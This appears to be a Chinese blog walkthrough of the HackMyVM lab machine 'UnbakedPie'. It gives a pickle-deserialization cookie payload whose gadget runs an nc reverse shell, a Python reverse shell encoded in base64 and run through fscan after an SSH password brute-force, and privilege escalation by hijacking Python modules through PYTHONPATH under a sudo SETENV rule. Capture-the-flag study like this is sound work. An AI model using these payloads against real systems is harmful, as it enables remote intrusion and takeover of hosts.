---
title: MazeSec UnbakedPie
date: 2025-04-01 17:34:00
categories: 
  - MazeSec
tags:
  - Pickle 反序列化
  - 敏感信息泄露
  - 环境变量劫持
---

# UnbakedPie

项目地址：https://downloads.hackmyvm.eu/unbakedpie.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a20da2c9ecef7401787c682.png)

## 反序列化

### Pickle 反序列化

查看网页，当我们搜索一个东西后会看到有 `search_cookie` 参数

![](https://pic1.imgdb.cn/item/6a20da6a9ecef7401787c69a.png)

在网络请求中看响应

![](https://pic1.imgdb.cn/item/6a20da959ecef7401787c6b4.png)

进行 Base64 解码

```
80 04 95 07 00 00 00 00 00 00 00 8c 03 61 61 61 91 6e
```

扔给 AI 梭哈，Pickle 反序列化

| 偏移 | 字节 | Opcode | 含义 | 操作 |
|------|------|--------|------|------|
| 0 | `\x80` | `PROTO` | 协议版本标识 | 声明使用 Pickle 协议版本 4 |
| 1 | `\x04` | (参数) | 版本号 | Protocol 4 |
| 2 | `\x95` | `FRAME` | 帧边界 | 标志一个新帧开始（Protocol 4+ 特性） |
| 3-10 | `\x07\x00\x00\x00\x00\x00\x00\x00` | (参数) | 帧长度 | 8字节小端整数 = 7（帧内数据长度） |
| 11 | `\x8c` | `SHORT_BINUNICODE` | 短 Unicode 字符串 | 后跟1字节长度 + UTF-8字符串 |
| 12 | `\x03` | (参数) | 字符串长度 | 长度 = 3 |
| 13-15 | `\x61\x61\x61` | (参数) | 字符串内容 | ASCII: `aaa` |
| 16 | `\x91` | `MEMOIZE` | 记忆化 | 将栈顶对象存入 memo（优化重复引用） |
| 17 | `\x2e` | `STOP` | 终止 | 返回栈顶对象，结束反序列化 |

还原出 Python 代码

```python
import pickle
import base64

# 序列化字符串 "aaa"
payload = pickle.dumps("aaa")

# Base64 编码后存入 Cookie
cookie_value = base64.b64encode(payload).decode()
print(cookie_value)  # 输出: gASVBwAAAAAAAACMA2FhYZQu
```

当 Python 执行 `pickle.loads(data)` 时，它并不是在 "解析数据"，而是启动了一个 Pickle 虚拟机 (PVM)

这是一个基于栈的执行环境，核心组件包括：

- 指令流：待执行的 Pickle 字节码

- 栈：用于存放操作数、中间结果和最终还原的对象

- 记忆区：一个字典，用于缓存已经创建的对象，处理循环引用和优化重复对象

当 Pickle 尝试序列化一个对象时，对于基础数据类型 `(int, str, list)`，它可以直接记录其值

但对于自定义类的实例或包含不可序列化状态（如文件句柄、Socket）的对象，Pickle 无法直接保存其内存状态

此时，Pickle 会调用该对象的 `__reduce__()`（或 `__reduce_ex__()`）魔法方法，询问对象："我该如何重建你？"

`__reduce__` 必须返回一个元组，最核心的结构是

```python
def __reduce__(self):
    # callable：一个可调用对象
    # args_tuple：传递给该可调用对象的参数元组
    return (callable, args_tuple)
```

当 PVM 遇到这种结构时，它会生成 `REDUCE` 指令，在反序列化阶段执行 `callable(*args_tuple)` 来 "复活" 该对象

理解了 `__reduce__` 和 `REDUCE`，Pickle RCE 的攻击链就非常清晰了

攻击者不需要序列化一个真实的复杂对象，只需要伪造一个 `__reduce__` 的返回值即可

```python
import pickle, os, base64
class RCE(object):
    def __reduce__(self):
        return (os.system,("nc -e /bin/bash 192.168.125.4 9999",))
print(base64.b64encode(pickle.dumps(RCE())))
```

得到

```
gASVOgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xMjUuNCA5OTk5lIWUUpQu
```

抓取搜索的包，替换掉 Cookie 发包拿到 Shell

## 提权

### 敏感信息泄露

信息收集发现是在 Docker 容器中

在站点目录中，发现一个数据库文件 `/home/site/db.sqlite3`，其中有很多用户

但是密码是加密的，对其爆破 SSH

```bash
./fscan -h 172.17.0.1 -user ramsey
```

得到凭证

```
ramsey:12345678
```

由于靶机上并未部署 SSH 客户端，所以采用 fscan 内置的命令执行功能

先准备好 Python 版本的反弹 Shell

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.125.4",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
/fscan -h 172.17.0.1 -user ramsey -pwd "12345678" -c "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTI1LjQiLDg4ODgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash"
```

### 环境变量劫持

在家目录中看到 `/home/ramsey/vuln.py`

```python
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
        banner = '''\033[33m
                                      (
                                       )
                                  __..---..__
                              ,-='  /  |  \  `=-.
                             :--..___________..--;
                              \.,_____________,./


██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
        return banner

#Function Instructions
def instructions():
        print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
        print "\t\t\t","1. Calculator"
        print "\t\t\t","2. Easy Calculator"
        print "\t\t\t","3. Credits"
        print "\t\t\t","4. Exit"
        print "\t\t\t",28 * "-"

def instructions2():
        print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
        print "\t\t\t","1. Add"
        print "\t\t\t","2. Subtract"
        print "\t\t\t","3. Multiply"
        print "\t\t\t","4. Divide"
        print "\t\t\t","5. Back"
        print "\t\t\t",28 * "-"

def credits():
        print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"

# Function Arithmetic

# Function to add two numbers
def add(num1, num2):
    return num1 + num2

# Function to subtract two numbers
def subtract(num1, num2):
    return num1 - num2

# Function to multiply two numbers
def multiply(num1, num2):
    return num1 * num2

# Function to divide two numbers
def divide(num1, num2):
    return num1 / num2
# Main
if __name__ == "__main__":
        print header()

        #Variables
        OPTIONS = 0
        OPTIONS2 = 0
        TOTAL = 0
        NUM1 = 0
        NUM2 = 0

        while(OPTIONS != 4):
                instructions()
                OPTIONS = int(input("\t\t\tEnter Options>>"))
                print "\033c"
                if OPTIONS == 1:
                        instructions2()
                        OPTIONS2 = int(input("\t\t\tEnter Options>>"))
                        print "\033c"
                        if OPTIONS2 == 5:
                                continue
                        else:
                                NUM1 = int(input("\t\t\tEnter Number1>>"))
                                NUM2 = int(input("\t\t\tEnter Number2>>"))
                                if OPTIONS2 == 1:
                                        TOTAL = add(NUM1,NUM2)
                                if OPTIONS2 == 2:
                                        TOTAL = subtract(NUM1,NUM2)
                                if OPTIONS2 == 3:
                                        TOTAL = multiply(NUM1,NUM2)
                                if OPTIONS2 == 4:
                                        TOTAL = divide(NUM1,NUM2)
                                print "\t\t\tTotal >> $",TOTAL
                if OPTIONS == 2:
                        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

                        print "\r\t\t\t     Waiting to extract..."
                        for i in range(len(animation)):
                            time.sleep(0.5)
                            sys.stdout.write("\r\t\t\t" + animation[i % len(animation)])
                            sys.stdout.flush()

                        LISTED = pytesseract.image_to_string(Image.open('payload.png'))

                        TOTAL = eval(LISTED)
                        print "\n\n\t\t\tTotal >> $",TOTAL
                if OPTIONS == 3:
                        credits()
        sys.exit(-1)
```

当 Python 解释器执行到这一行时，它需要定位并加载 `pytesseract` 模块

```python
import pytesseract
```

我们可以创建一个恶意文件打环境变量劫持

```bash
touch pytesseract.py
echo "import pty" > pytesseract.py
echo 'pty.spawn("/bin/bash")' >> pytesseract.py

sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
```

检查 oliver 用户权限

```bash
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

查看源码

```python
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

还是一样打环境变量劫持

```python
touch /tmp/docker.py
echo "import pty" >> /tmp/docker.py
echo 'pty.spawn("/bin/bash")' >> /tmp/docker.py
sudo PYTHONPATH=/tmp python /opt/dockerScript.py
```

```
Unb4ked_W00tw00t
Unb4ked_GOtcha!
```